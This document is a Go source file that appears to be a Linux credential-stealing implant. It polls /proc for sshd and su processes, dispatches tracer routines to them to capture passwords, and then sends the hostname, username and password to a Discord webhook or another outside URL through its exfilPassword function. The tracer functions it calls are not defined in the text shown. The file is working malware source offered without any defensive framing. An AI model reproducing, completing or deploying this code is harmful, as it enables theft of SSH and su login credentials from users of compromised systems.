package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

func findPids() []int {
	var sshdPids []int
	currentPID := os.Getpid()
	procDirs, err := ioutil.ReadDir("/proc")
	if err != nil {
		return nil
	}
	for _, dir := range procDirs {
		if dir.IsDir() {
			pid, err := strconv.Atoi(dir.Name())
			if err == nil && pid != currentPID {
				sshdPids = append(sshdPids, pid)
			}
		}
	}
	return sshdPids
}

func isSSHPid(pid int) bool {
	cmdLine, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return false
	}
	cmdLineStr := strings.ReplaceAll(string(cmdLine), "\x00", " ")

	patterns := []string{
		`sshd:.*\[net\]`,
		`sshd:.*@`,
		`^sshd:`,
		`sshd.*\[priv\]`,
		`sshd.*\[accepted\]`,
		`sshd-auth:`,
		`sshd-session:`,
	}

	for _, pattern := range patterns {
		if matched, _ := regexp.MatchString(pattern, cmdLineStr); matched {
			return true
		}
	}
	return false
}

func isSUPid(pid int) bool {
	cmdLine, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return false
	}
	return regexp.MustCompile(`^su `).MatchString(strings.ReplaceAll(string(cmdLine), "\x00", " "))
}

var webhookURL string

func exfilPassword(username, password string) {
	hostname, err := os.Hostname()
	if err != nil {
		return
	}

	if webhookURL == "" {
		fmt.Printf("hostname=%s username=%s password=%s\n", hostname, username, password)
		return
	}

	if strings.Contains(webhookURL, "discord.com/api/webhooks") || strings.Contains(webhookURL, "discordapp.com/api/webhooks") {
		content := fmt.Sprintf("**Hostname:** %s\n**Username:** %s\n**Password:** %s", hostname, username, password)
		payload := map[string]string{
			"content": content,
		}
		jsonData, _ := json.Marshal(payload)

		req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer(jsonData))
		if err != nil {
			return
		}
		req.Header.Set("Content-Type", "application/json")

		client := &http.Client{}
		_, _ = client.Do(req)
	} else {
		values := url.Values{}
		values.Set("hostname", hostname)
		values.Set("username", username)
		values.Set("password", password)
		fullURL := fmt.Sprintf("%s?%s", webhookURL, values.Encode())

		if strings.HasPrefix(webhookURL, "https://") {
			_, _ = http.Get(fullURL)
		} else if strings.HasPrefix(webhookURL, "http://") {
			_, _ = http.Get(fullURL)
		} else {
			fullURL = fmt.Sprintf("https://%s?%s", webhookURL, values.Encode())
			_, _ = http.Get(fullURL)
		}
	}
}

func main() {
	if len(os.Args) > 1 {
		webhookURL = os.Args[1]
	}

	var processedFirstPID bool
	var processedPids []int
	var processedPidsMutex sync.Mutex

	for {
		pids := findPids()
		for _, pid := range pids {
			processedPidsMutex.Lock()

			if isSSHPid(pid) && (!processedFirstPID || !contains(processedPids, pid)) {
				if !processedFirstPID {
					processedFirstPID = true
				} else {
					go traceSSHDProcess(pid)
					processedPids = append(processedPids, pid)
				}
			}

			if isSUPid(pid) && (!processedFirstPID || !contains(processedPids, pid)) {
				if !processedFirstPID {
					processedFirstPID = true
				} else {
					go traceSUProcess(pid)
					processedPids = append(processedPids, pid)
				}
			}

			processedPidsMutex.Unlock()
		}
		time.Sleep(250 * time.Millisecond)
	}
}
